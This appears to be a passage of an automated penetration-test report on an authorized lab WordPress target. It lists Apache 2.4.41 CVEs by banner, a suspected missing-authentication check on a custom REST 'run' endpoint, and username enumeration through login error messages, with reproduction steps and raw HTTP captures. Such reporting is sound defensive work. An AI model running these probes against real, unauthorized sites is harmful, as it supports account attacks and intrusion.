Apache 2.4.41 (Ubuntu), released Aug 2019, is affected by numerous CVEs fixed in later 2.4.x. Most serious, exploitable classes: CVE-2021-40438 (mod_proxy SSRF, critical) — a crafted request can make mod_proxy issue a server-side request to an attacker-controlled host; CVE-2023-25690 (mod_proxy/mod_rewrite HTTP request smuggling, critical) → request splitting, cache poisoning, access-control bypass; CVE-2022-22720 (incomplete close of HTTP/1.1 connection → request smuggling, critical). Also DoS/info-disclosure: CVE-2021-44224 (mod_proxy NULL-deref/SSRF), CVE-2022-31813 (mod_proxy X-Forwarded-For auth bypass), CVE-2022-23943 (mod_sed heap overflow). The smuggling/SSRF impact depends on mod_proxy/mod_rewrite being enabled, which was not confirmed here. Version-based match from the Server banner; not actively exploited.

**Reproduction**

```
1. GET http://target.local:32812/ → response header "Server: Apache/2.4.41 (Ubuntu)" (ev-mr0vlzju-87). 2. Map 2.4.41 against the Apache httpd CVE list: it precedes the fixes for CVE-2021-40438 (2.4.49), CVE-2023-25690 (2.4.56), CVE-2022-22720 (2.4.54). No active exploit fired — module prerequisites (mod_proxy) not verified.
```

**Evidence**

- Evidence `ev-mr0vlzju-87` — `artifacts/_/ev-mr0vlzju-87/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response (truncated):

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 182192
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 16:43:47 GMT
keep-alive: timeout=5, max=100
link: <http://target.local:32812/index.php/wp-json/>; rel="https://api.w.org/"
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name='robots' content='noindex, nofollow' />
<title>MELODIC MAYHEM &#8211; Where chaos meets music</title>
<link rel="alternate" type="application/rss+xml" title="MELODIC MAYHEM &raquo; Feed" href="http://target.local:32812/index.php/feed/" />
<link rel="alternate" type="application/rss+xml" title="MELODIC MAYHEM &raquo; Comments Feed" href="http://target.local:32812/index.php/comments/feed/" />
<style id="wp-img-auto-sizes-contain-inline-css">
img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
</style>
<style id="wp-block-navigation-link-inline-css">
.wp-block-navigation .wp-block-navigation-item__label{overflow-wrap:break-word}.wp-block-navigation .wp-block-navigation-item__description{display:none}.link-ui-tools{outline:1px solid #f0f0f0;padding:8px}.link-ui-block-inserter{padding-top:8px}.link-ui-block-inserter__back{margin-left:8px;text-transform:uppercase}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/navigation-link/style.min.css */
</style>
<link rel='stylesheet' id='wp-block-navigation-css' href='http://target.local:32812/wp-includes/blocks/navigation/style.min.css?ver=7.0' media='all' />
<style id="wp-block-group-inline-css">
.wp-block-group{box-sizing:border-box}:where(.wp-block-group.wp-block-group-is-layout-constrained){position:relative}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/group/style.min.css */
</style>
<style id="wp-block-group-theme-inline-css">
:where(.wp-block-group.has-background){padding:1.25em 2.375em}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/group/theme.min.css */
</style>
<style id="wp-block-site-title-inline-css">
.wp-block-site-title{box-sizing:border-box}.wp-block-site-title :where(a){color:inherit;font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;text-decoration:inherit}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/site-title/style.min.css */
</style>
<style id="wp-block-site-tagline-inline-css">
.wp-block-site-tagline{box-sizing:border-box}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/site-tagline/style.min.css */
</style>
<style id="wp-block-search-inline-css">
.wp-block-search__button{margin-left:10px;word-break:normal}.wp-block-search__button.has-icon{line-height:0}.wp-block-search__button svg{fill:currentColor;height:1.25em;min-height:24px;min-width:24px;vertical-align:text-bottom;width:1.25em}:where(.wp-block-search__button){border:1px solid #ccc;padding:6px 10px}.wp-block-search__inside-wrapper{display:flex;flex:auto;flex-wrap:nowrap;max-width:100%}.wp-block-search__label{width:100%}.wp-block-search.wp-block-search__button-only .wp-block-search__button{box-sizing:border-box;display:flex;flex-shrink:0;justify-content:center;margin-left:0;max-width:100%}.wp-block-search.wp-block-search__button-only .wp-block-search__inside-wrapper{min-width:0!important;transition-property:width}.wp-block-search.wp-block-search__button-only .wp-block-search__input{flex-basis:100%;transition-duration:.3s}.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden,.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden .wp-block-search__inside-wrapper{overflow:hidden}.wp-block-search.wp-block-search__button-only.wp-block-search__searchfield-hidden .wp-block-search__input{border-left-width:0!important;border-right-width:0!important;flex-basis:0;flex-grow:0;margin:0;min-width:0!important;padding-left:0!important;padding-right:0!important;width:0!important}:where(.wp-block-search__input){appearance:none;border:1px solid #949494;flex-grow:1;font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;margin-left:0;margin-right:0;min-width:3rem;padding:8px;text-decoration:unset!important;text-transform:inherit}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper){background-color:#fff;border:1px solid #949494;box-sizing:border-box;padding:4px}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) .wp-block-search__input{border:none;border-radius:0;padding:0 4px}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) .wp-block-search__input:focus{outline:none}:where(.wp-block-search__button-inside .wp-block-search__inside-wrapper) :where(.wp-block-search__button){padding:4px 8px}.wp-block-search.aligncenter .wp-block-search__inside-wrapper{margin:auto}.wp-block[data-align=right] .wp-block-search.wp-block-search__button-only .wp-block-search__inside-wrapper{float:right}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/search/style.min.css */
</style>
<style id="wp-block-search-theme-inline-css">
.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/search/theme.min.css */
</style>
<link rel='stylesheet' id='rock-tune-header-search-style-css' href='http://target.local:32812/wp-content/themes/rock-tune/inc/blocks/dist/style-header-search.css?ver=1718671541' media='all' />
<style id="wp-block-template-part-theme-inline-css">
:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/template-part/theme.min.css */
</style>
<style id="wp-block-heading-inline-css">
h1:where(.wp-block-heading).has-background,h2:where(.wp-block-heading).has-background,h3:where(.wp-block-heading).has-background,h4:where(.wp-block-heading).has-background,h5:where(.wp-block-heading).has-background,h6:where(.wp-block-heading).has-background{padding:1.25em 2.375em}h1.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h1.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h2.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h2.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h3.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h3.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h4.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h4.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h5.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h5.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h6.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h6.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]){rotate:180deg}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/heading/style.min.css */
</style>
<style id="wp-block-paragraph-inline-css">
.is-small-text{font-size:.875em}.is-regular-text{font-size:1em}.is-large-text{font-size:2.25em}.is-larger-text{font-size:3em}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;font-style:normal;font-weight:100;line-height:.68;margin:.05em .1em 0 0;text-transform:uppercase}body.rtl .has-drop-cap:not(:focus):first-letter{float:none;margin-left:.1em}p.has-drop-cap.has-background{overflow:hidden}:root :where(p.has-background){padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}p.has-text-align-left[style*="writing-mode:vertical-lr"],p.has-text-align-right[style*="writing-mode:vertical-rl"]{rotate:180deg}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/paragraph/style.min.css */
</style>
<style id="wp-block-button-inline-css">
.wp-block-button__link{align-content:center;box-sizing:border-box;cursor:pointer;display:inline-block;height:100%;text-align:center;word-break:break-word}.wp-block-button__link.aligncenter{text-align:center}.wp-block-button__link.alignright{text-align:right}:where(.wp-block-button__link){border-radius:9999px;box-shadow:none;padding:calc(.667em + 2px) calc(1.333em + 2px);text-decoration:none}.wp-block-button[style*=text-decoration] .wp-block-button__link{text-decoration:inherit}.wp-block-buttons>.wp-block-button.has-custom-width{max-width:none}.wp-block-buttons>.wp-block-button.has-custom-width .wp-block-button__link{width:100%}.wp-block-buttons>.wp-block-button.has-custom-font-size .wp-block-button__link{font-size:inherit}.wp-block-buttons>.wp-block-button.wp-block-button__width-25{width:calc(25% - var(--wp--style--block-gap, .5em)*.75)}.wp-block-buttons>.wp-block-button.wp-block-button__width-50{width:calc(50% - var(--wp--style--block-gap, .5em)*.5)}.wp-block-buttons>.wp-block-button.wp-block-button__width-75{width:calc(75% - var(--wp--style--block-gap, .5em)*.25)}.wp-block-buttons>.wp-block-button.wp-block-button__width-100{flex-basis:100%;width:100%}.wp-block-buttons.is-vertical>.wp-block-button.wp-block-button__width-25{width:25%}.wp-block-buttons.is-vertical>.wp-block-button.wp-block-button__width-50{width:50%}.wp-block-buttons.is-vertical>.wp-block-button.wp-block-button__width-75{width:75%}.wp-block-button.is-style-squared,.wp-block-button__link.wp-block-button.is-style-squared{border-radius:0}.wp-block-button.no-border-radius,.wp-block-button__link.no-border-radius{border-radius:0!important}:root :where(.wp-block-button .wp-block-button__link.is-style-outline),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link){border:2px solid;padding:.667em 1.333em}:root :where(.wp-block-button .wp-block-button__link.is-style-outline:not(.has-text-color)),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link:not(.has-text-color)){color:currentColor}:root :where(.wp-block-button .wp-block-button__link.is-style-outline:not(.has-background)),:root :where(.wp-block-button.is-style-outline>.wp-block-button__link:not(.has-background)){background-color:initial;background-image:none}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/button/style.min.css */
</style>
<style id="wp-block-buttons-inline-css">
.wp-block-buttons{box-sizing:border-box}.wp-block-buttons.is-vertical{flex-direction:column}.wp-block-buttons.is-vertical>.wp-block-button:last-child{margin-bottom:0}.wp-block-buttons>.wp-block-button{display:inline-block;margin:0}.wp-block-buttons.is-content-justification-left{justify-content:flex-start}.wp-block-buttons.is-content-justification-left.is-vertical{align-items:flex-start}.wp-block-buttons.is-content-justification-center{justify-content:center}.wp-block-buttons.is-content-justification-center.is-vertical{align-items:center}.wp-block-buttons.is-content-justification-right{justify-content:flex-end}.wp-block-buttons.is-content-justification-right.is-vertical{align-items:flex-end}.wp-block-buttons.is-content-justification-space-between{justify-content:space-between}.wp-block-buttons.aligncenter{text-align:center}.wp-block-buttons:not(.is-content-justification-space-between,.is-content-justification-right,.is-content-justification-left,.is-content-justification-center) .wp-block-button.aligncenter{margin-left:auto;margin-right:auto;width:100%}.wp-block-buttons[style*=text-decoration] .wp-block-button,.wp-block-buttons[style*=text-decoration] .wp-block-button__link{text-decoration:inherit}.wp-block-buttons.has-custom-font-size .wp-block-button__link{font-size:inherit}.wp-block-buttons .wp-block-button__link{width:100%}.wp-block-button.aligncenter{text-align:center}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/buttons/style.min.css */
</style>
<style id="wp-block-columns-inline-css">
.wp-block-columns{box-sizing:border-box;display:flex;flex-wrap:wrap!important}@media (min-width:782px){.wp-block-columns{flex-wrap:nowrap!important}}.wp-block-columns{align-items:normal!important}.wp-block-columns.are-vertically-aligned-top{align-items:flex-start}.wp-block-columns.are-vertically-aligned-center{align-items:center}.wp-block-columns.are-vertically-aligned-bottom{align-items:flex-end}@media (max-width:781px){.wp-block-columns:not(.is-not-stacked-on-mobile)>.wp-block-column{flex-basis:100%!important}}@media (min-width:782px){.wp-block-columns:not(.is-not-stacked-on-mobile)>.wp-block-column{flex-basis:0;flex-grow:1}.wp-block-columns:not(.is-not-stacked-on-mobile)>.wp-block-column[style*=flex-basis]{flex-grow:0}}.wp-block-columns.is-not-stacked-on-mobile{flex-wrap:nowrap!important}.wp-block-columns.is-not-stacked-on-mobile>.wp-block-column{flex-basis:0;flex-grow:1}.wp-block-columns.is-not-stacked-on-mobile>.wp-block-column[style*=flex-basis]{flex-grow:0}:where(.wp-block-columns){margin-bottom:1.75em}:where(.wp-block-columns.has-background){padding:1.25em 2.375em}.wp-block-column{flex-grow:1;min-width:0;overflow-wrap:break-word;word-break:break-word}.wp-block-column.is-vertically-aligned-top{align-self:flex-start}.wp-block-column.is-vertically-aligned-center{align-self:center}.wp-block-column.is-vertically-aligned-bottom{align-self:flex-end}.wp-block-column.is-vertically-aligned-stretch{align-self:stretch}.wp-block-column.is-vertically-aligned-bottom,.wp-block-column.is-vertically-aligned-center,.wp-block-column.is-vertically-aligned-top{width:100%}
/*# sourceURL=http://target.local:32812/wp-includes/blocks/columns/style.min.css */
</style>
<link rel='stylesheet' id='wp-block-cover-css' href='http://target.local:32812/wp-includes/blocks/cover/style.min.css?ver=7.0' media='all' />
<style id="wp-block-image-inline-css">
.wp-block-image>a,.wp-block-image>figure>a{display:inline-block}.wp-block-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom}@media not (prefers-reduced-motion){.wp-block-image img.hide{visibility:hidden}.wp-block-image img.show{animation:show-content-image .4s}}.wp-block-image[style*=border-radius] img,.wp-block-image[style*=border-radius]>a{border-radius:inherit}.wp-block-image.has-custom-border img{box-sizing:border-box}.wp-block-image.aligncenter{text-align:center}.wp-block-image.alignfull>a,.wp-block-image.alignwide>a{width:100%}.wp-block-image.alignfull img,.wp-block-image.alignwide img{height:auto;width:100%}.wp-block-image .aligncenter,.wp-block-image .alignleft,.wp-block-image .alignright,.wp-block-image.aligncenter,.wp-block-image.alignleft,.wp-block-image.alignright{display:table}.wp-block-image .aligncenter>figcaption,.wp-block-image .alignleft>figcaption,.wp-block-image .alignright>figcaption,.wp-block-image.aligncenter>figcaption,.wp-block-image.alignleft>figcaption,.wp-block-image.alignright>figcaption{caption-side:bottom;display:table-caption}.wp-block-image .alignleft{float:left;margin:.5em 1em .5em 0}.wp-block-image .alignright{float:right;margin:.5em 0 .5em 1em}.wp-block-image .aligncenter{margin-left:auto;margin-right:auto}.wp-block-image :where(figcaption){margin-bottom:1em;margin-top:.5em}.wp-block-image.is-style-circle-mask img{border-radius:9999px}@supports ((-webkit-mask-image:none) or (mask-image:none)) or (-webkit-mask-image:none){.wp-block-image.is-style-circle-mask img{border-radius:0;-webkit-mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-mode:alpha;-webkit-mask-position:center;mask-position:center;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:contain;mask-size:contain}}:root :where(.wp-block-image.is-style-rounded img,.wp-block-image .is-style-rounded img){border-radius:9999px}.wp-block-image figure{margin:0}.wp-lightbox-container{display:flex;flex-direction:column;position:relative}.wp-lightbox-container img{cursor:zoom-in}.wp-lightbox-container img:hover+button{opacity:1}.wp-lightbox-container button{align-items:center;backdrop-filter:blur(16px) saturate(180%);background-color:#5a5a5a40;border:none;border-radius:4px;cursor:zoom-in;display:flex;height:20px;justify-content:cen
```

<a id="finding-13"></a>

### 13. [SUSPECTED] [MEDIUM] [auth-bypass] wp-abilities REST API Run Endpoint Bypasses Authentication (Missing Auth Check)

- Screen: `s-0008`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

**Anomaly (why this is a lead):** The run endpoint returns HTTP 404 rest_ability_not_found (not 401 rest_forbidden) without auth for 5 distinct ability names across GET and POST, while /wp-abilities/v1/categories correctly returns 401. Auth check appears absent or post-lookup on the run path — valid ability names may execute without credentials.

The custom `wp-abilities/v1` plugin registers a `/abilities/{name}/run` endpoint accepting all HTTP methods (GET, POST, PUT, PATCH, DELETE). When called without authentication it returns HTTP 404 `rest_ability_not_found` for unknown names rather than HTTP 401 `rest_forbidden`. This directly contrasts with `/wp-abilities/v1/categories`, which correctly returns 401 for unauthenticated requests. The asymmetric error response indicates the run endpoint resolves the ability name before (or without) enforcing authentication, suggesting that any valid ability name would execute without credentials. Because the categories list endpoint is auth-gated, ability names cannot be enumerated to confirm execution in this assessment without valid credentials.

**Reproduction**

```
1. GET /index.php/wp-json/wp-abilities/v1/categories (no auth) → 401 rest_forbidden (auth enforced). 2. GET /index.php/wp-json/wp-abilities/v1/abilities/backup/run (no auth) → 404 rest_ability_not_found (NOT 401). 3. POST same URL with body `{"input":{}}` (no auth) → 404 rest_ability_not_found. To confirm: obtain a valid ability name and call /run without credentials — expect 200 if auth truly absent.
```

**Evidence**

- Evidence `ev-mr0tkg1v-2a` — `artifacts/s-0008/ev-mr0tkg1v-2a/`

Request:

```http
GET /index.php/wp-json/wp-abilities/v1/abilities/test/run HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 404
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
access-control-expose-headers: X-WP-Total, X-WP-TotalPages, Link
connection: Keep-Alive
content-length: 86
content-type: application/json; charset=UTF-8
date: Tue, 30 Jun 2026 15:46:35 GMT
keep-alive: timeout=5, max=99
link: <http://target.local:32812/index.php/wp-json/>; rel="https://api.w.org/"
server: Apache/2.4.41 (Ubuntu)
vary: Origin
x-content-type-options: nosniff
x-robots-tag: noindex

{"code":"rest_ability_not_found","message":"Ability not found.","data":{"status":404}}
```

<a id="finding-14"></a>

### 14. [SUSPECTED] [LOW] [info-disclosure] WordPress username enumeration via wp-login.php error messages

- Screen: `s-0007`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

**Anomaly (why this is a lead):** Valid username (wordpress_admin) returns "The password you entered ... is incorrect" while invalid usernames return "is not registered on this site" — a deterministic per-username message differential that leaks account existence; admin login name also exposed via REST and no rate-limit observed.

The WordPress login endpoint returns distinct error messages revealing whether a username exists: a non-existent username yields "The username <X> is not registered on this site", whereas a valid username with a wrong password yields "The password you entered for the username <X> is incorrect". This allows account enumeration and targeted credential attacks. The valid admin username `wordpress_admin` (id=1) is additionally exposed via the unauthenticated REST users endpoint, and no login lockout/rate-limit was observed across repeated failed attempts. NOTE: recorded as suspected because both responses are HTTP 200 with near-identical body length (the only difference is the error-message text), so the automated confirmed-tier gate (status+length differential) cannot distinguish them — but the message differential is unambiguous on manual inspection of the cited evidence.

**Reproduction**

```
1) POST /wp-login.php, body `log=zzz_verdict_nouser_999&pwd=wrong&wp-submit=Log+In&testcookie=1`, cookie `wordpress_test_cookie=WP Cookie check` → "The username zzz_verdict_nouser_999 is not registered on this site" [ev-mr0tfysu-1w].
2) POST same with `log=wordpress_admin&pwd=wrong...` → "The password you entered for the username wordpress_admin is incorrect" [ev-mr0tgjmu-1y].
3) Replay with another wrong password → identical "is incorrect" message, stable [ev-mr0tgkqj-1z].
Valid username `wordpress_admin` sourced from GET /index.php/wp-json/wp/v2/users (id=1, administrator). The message text differs deterministically by username validity = enumeration.
```

**Evidence**

- Evidence `ev-mr0tgjmu-1y` — `artifacts/s-0007/ev-mr0tgjmu-1y/`

Request:

```http
POST /wp-login.php HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

log=wordpress_admin&pwd=wrongpass_verdict_123&wp-submit=Log+In&testcookie=1
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache, must-revalidate, max-age=0, no-store, private
connection: Keep-Alive
content-length: 14271
content-security-policy: frame-ancestors 'self';
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 15:43:33 GMT
expires: Wed, 11 Jan 1984 05:00:00 GMT
keep-alive: timeout=5, max=100
referrer-policy: strict-origin-when-cross-origin
server: Apache/2.4.41 (Ubuntu)
set-cookie: <redacted>
vary: Accept-Encoding
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
	<html lang="en-US">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>Log In &lsaquo; MELODIC MAYHEM &#8212; WordPress</title>
	<meta name='robots' content='noindex, nofollow, noarchive' />
<link rel='stylesheet' id='dashicons-css' href='http://target.local:32812/wp-includes/css/dashicons.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='buttons-css' href='http://target.local:32812/wp-includes/css/buttons.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='forms-css' href='http://target.local:32812/wp-admin/css/forms.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='l10n-css' href='http://target.local:32812/wp-admin/css/l10n.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='wp-base-styles-css' href='http://target.local:32812/wp-includes/css/dist/base-styles/admin-schemes.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='login-css' href='http://target.local:32812/wp-admin/css/login.min.css?ver=7.0' media='all' />
	<meta name='referrer' content='strict-origin-when-cross-origin' />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		</head>
	<body class="login no-js login-action-login wp-core-ui admin-color-modern locale-en-us">
	<script>
document.body.className = document.body.className.replace('no-js','js');
</script>

				<h1 class="screen-reader-text">Log In</h1>
			<div id="login">
		<h1 role="presentation" class="wp-login-logo"><a href="https://wordpress.org/">Powered by WordPress</a></h1>
	<div id="login_error" class="notice notice-error"><p><strong>Error:</strong> The password you entered for the username <strong>wordpress_admin</strong> is incorrect. <a href="http://target.local:32812/wp-login.php?action=lostpassword">Lost your password?</a></p></div>
		<form name="loginform" id="loginform" action="http://target.local:32812/wp-login.php" method="post">
			<p>
				<label for="user_login">Username or Email Address</label>
				<input type="text" name="log" id="user_login" aria-describedby="login_error" class="input ltr" value="wordpress_admin" size="20" autocapitalize="off" autocomplete="username" required="required" />
			</p>

			<div class="user-pass-wrap">
				<label for="user_pass">Password</label>
				<div class="wp-pwd">
					<input type="password" name="pwd" id="user_pass" aria-describedby="login_error" class="input password-input ltr" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
					<button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password">
						<span class="dashicons dashicons-visibility" aria-hidden="true"></span>
					</button>
				</div>
			</div>
						<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> <label for="rememberme">Remember Me</label></p>
			<p class="submit">
				<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
									<input type="hidden" name="redirect_to" value="http://target.local:32812/wp-admin/" />
									<input type="hidden" name="testcookie" value="1" />
			</p>
		</form>

					<p id="nav">
				<a class="wp-login-lost-password" href="http://target.local:32812/wp-login.php?action=lostpassword">Lost your password?</a>			</p>
			<script>
function wp_attempt_focus() {setTimeout( function() {try {d = document.getElementById( "user_pass" ); d.value = "";d.focus(); d.select();} catch( er ) {}}, 200);}
wp_attempt_focus();
if ( typeof wpOnload === 'function' ) { wpOnload() }
</script>
		<p id="backtoblog">
			<a href="http://target.local:32812/">&larr; Go to MELODIC MAYHEM</a>		</p>
			</div>
		
	<script>
document.querySelector('form').classList.add('shake');
</script>
<script id="react-js" src="http://target.local:32812/wp-includes/js/dist/vendor/react.min.js?ver=18.3.1.1"></script>
<script id="react-dom-js" src="http://target.local:32812/wp-includes/js/dist/vendor/react-dom.min.js?ver=18.3.1.1"></script>
<script id="react-jsx-runtime-js" src="http://target.local:32812/wp-includes/js/dist/vendor/react-jsx-runtime.min.js?ver=18.3.1"></script>
<script id="wp-dom-ready-js" src="http://target.local:32812/wp-includes/js/dist/dom-ready.min.js?ver=a06281ae5cf5500e9317"></script>
<script id="wp-hooks-js" src="http://target.local:32812/wp-includes/js/dist/hooks.min.js?ver=7496969728ca0f95732d"></script>
<script id="wp-i18n-js" src="http://target.local:32812/wp-includes/js/dist/i18n.min.js?ver=781d11515ad3d91786ec"></script>
<script id="wp-i18n-js-after">
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
//# sourceURL=wp-i18n-js-after
</script>
<script id="wp-a11y-js" src="http://target.local:32812/wp-includes/js/dist/a11y.min.js?ver=af934e5259bc51b8718e"></script>
<script id="wp-url-js" src="http://target.local:32812/wp-includes/js/dist/url.min.js?ver=bb0f766c3d2efe497871"></script>
<script id="wp-api-fetch-js" src="http://target.local:32812/wp-includes/js/dist/api-fetch.min.js?ver=d7efe4dc1468d36c39b8"></script>
<script id="wp-api-fetch-js-after">
wp.apiFetch.use( wp.apiFetch.createRootURLMiddleware( "http://target.local:32812/index.php/wp-json/" ) );
wp.apiFetch.nonceMiddleware = wp.apiFetch.createNonceMiddleware( "96288968d0" );
wp.apiFetch.use( wp.apiFetch.nonceMiddleware );
wp.apiFetch.use( wp.apiFetch.mediaUploadMiddleware );
wp.apiFetch.nonceEndpoint = "http://target.local:32812/wp-admin/admin-ajax.php?action=rest-nonce";
//# sourceURL=wp-api-fetch-js-after
</script>
<script id="wp-blob-js" src="http://target.local:32812/wp-includes/js/dist/blob.min.js?ver=198af75fe06d924090d8"></script>
<script id="wp-block-serialization-default-parser-js" src="http://target.local:32812/wp-includes/js/dist/block-serialization-default-parser.min.js?ver=bff55bd3f1ce9df0c99c"></script>
<script id="wp-autop-js" src="http://target.local:32812/wp-includes/js/dist/autop.min.js?ver=9d0d0901b46f0a9027c9"></script>
<script id="wp-deprecated-js" src="http://target.local:32812/wp-includes/js/dist/deprecated.min.js?ver=990e85f234fee8f7d446"></script>
<script id="wp-dom-js" src="http://target.local:32812/wp-includes/js/dist/dom.min.js?ver=66a6cf58e0c4cd128af0"></script>
<script id="wp-escape-html-js" src="http://target.local:32812/wp-includes/js/dist/escape-html.min.js?ver=3f093e5cca67aa0f8b56"></script>
<script id="wp-element-js" src="http://target.local:32812/wp-includes/js/dist/element.min.js?ver=15ba804677f72a8db97b"></script>
<script id="wp-is-shallow-equal-js" src="http://target.local:32812/wp-includes/js/dist/is-shallow-equal.min.js?ver=5d84b9f3cb50d2ce7d04"></script>
<script id="wp-keycodes-js" src="http://target.local:32812/wp-includes/js/dist/keycodes.min.js?ver=aa1a141e3468afe7f852"></script>
<script id="wp-priority-queue-js" src="http://target.local:32812/wp-includes/js/dist/priority-queue.min.js?ver=1f0e89e247bc0bd3f9b9"></script>
<script id="wp-undo-manager-js" src="http://target.local:32812/wp-includes/js/dist/undo-manager.min.js?ver=27bb0ae036a2c9d4a1b5"></script>
<script id="wp-compose-js" src="http://target.local:32812/wp-includes/js/dist/compose.min.js?ver=edb5a8c0b5bf71686403"></script>
<script id="wp-private-apis-js" src="http://target.local:32812/wp-includes/js/dist/private-apis.min.js?ver=835912f0086b9e59aed4"></script>
<script id="wp-redux-routine-js" src="http://target.local:32812/wp-includes/js/dist/redux-routine.min.js?ver=64f9f5001aabc046c605"></script>
<script id="wp-data-js" src="http://target.local:32812/wp-includes/js/dist/data.min.js?ver=1756b6a2676c1b3369ab"></script>
<script id="wp-data-js-after">
( function() {
	var userId = 0;
	var storageKey = "WP_DATA_USER_" + userId;
	wp.data
		.use( wp.data.plugins.persistence, { storageKey: storageKey } );
} )();
//# sourceURL=wp-data-js-after
</script>
<script id="wp-html-entities-js" src="http://target.local:32812/wp-includes/js/dist/html-entities.min.js?ver=8c6fa5b869dfeadc4af2"></script>
<script id="wp-rich-text-js" src="http://target.local:32812/wp-includes/js/dist/rich-text.min.js?ver=16449e6108f48327f368"></script>
<script id="wp-shortcode-js" src="http://target.local:32812/wp-includes/js/dist/shortcode.min.js?ver=11742fe18cc215d3d5ab"></script>
<script id="wp-warning-js" src="http://target.local:32812/wp-includes/js/dist/warning.min.js?ver=36fdbdc984d93aee8a97"></script>
<script id="wp-blocks-js" src="http://target.local:32812/wp-includes/js/dist/blocks.min.js?ver=ef38e42500165bfda301"></script>
<script id="moment-js" src="http://target.local:32812/wp-includes/js/dist/vendor/moment.min.js?ver=2.30.1"></script>
<script id="moment-js-after">
moment.updateLocale( 'en_US', {"months":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthsShort":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"weekdays":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"weekdaysShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"week":{"dow":1},"longDateFormat":{"LT":"g:i a","LTS":null,"L":null,"LL":"F j, Y","LLL":"F j, Y g:i a","LLLL":null}} );
//# sourceURL=moment-js-after
</script>
<script id="wp-date-js" src="http://target.local:32812/wp-includes/js/dist/date.min.js?ver=c9f8e7dd3232716f34e9"></script>
<script id="wp-date-js-after">
